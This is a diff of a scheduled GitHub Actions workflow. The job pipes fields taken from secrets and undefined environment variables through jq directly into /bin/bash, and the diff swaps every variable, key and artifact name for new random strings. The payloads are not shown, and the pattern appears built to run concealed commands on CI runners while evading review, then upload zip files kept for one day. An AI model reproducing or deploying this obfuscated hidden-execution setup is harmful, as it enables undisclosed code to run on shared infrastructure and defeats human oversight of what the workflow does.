@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '40 5,11,17,23 * * *'
+    - cron: '9 5,11,17,23 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,16 +15,18 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          izj285: ${{ secrets.izj285 }}
+          tznj3238: ${{ secrets.tznj3238 }}
         run: |
-          printf '%s' "$izj285" | jq -r .p8 | /bin/bash
-          echo $zzb57754 | jq -r .xmcam4371 | /bin/bash
-          echo $kb648 | jq -r .tczlx91 | /bin/bash
-          echo $dkdlj73 | jq -r .vd80467 | /bin/bash
+          printf '%s' "$tznj3238" | jq -r .f8 | /bin/bash
+          printf '%s' "$w89079" | jq -r .zxhej58604 | /bin/bash
+          echo $fy50780 | jq -r .qevll0 | /bin/bash
+          printf '%s' "$mk5210" | jq -r .w237 | /bin/bash
+          printf '%s' "$fnswa87" | jq -r .cogz82490 | /bin/bash
+          echo $qpqan8 | jq -r .lsp0 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: 2pGPjyYz
+          name: oOjcA6C8
           path: "*.zip"
           retention-days: 1
